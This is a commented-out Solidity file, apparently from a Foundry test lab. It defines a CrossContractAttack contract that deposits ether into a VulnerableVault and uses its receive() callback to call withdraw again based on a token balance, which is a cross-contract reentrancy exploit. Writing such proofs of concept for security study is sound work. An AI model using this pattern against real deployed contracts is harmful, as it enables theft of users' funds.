// //SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";
// import "./VulnerableVault.sol";
// import "./VulnerableToken.sol";

// contract CrossContractAttack {
//     VulnerableToken public token;
//     VulnerableVault public vault;

//     constructor(VulnerableVault _vault, VulnerableToken _token) {
//         vault = _vault;
//         token = _token;
//     }

//     function attack() external payable {
//         require(msg.value > 0, "zero attack value");
//         vault.deposit{value: msg.value}();
//         vault.withdraw(msg.value);
//     }

//     receive() external payable {
//         uint256 tokenBalance = token.balanceOf(address(this));
//         if (tokenBalance > 0) {
//             vault.withdraw(tokenBalance);
//         }
//     }
// }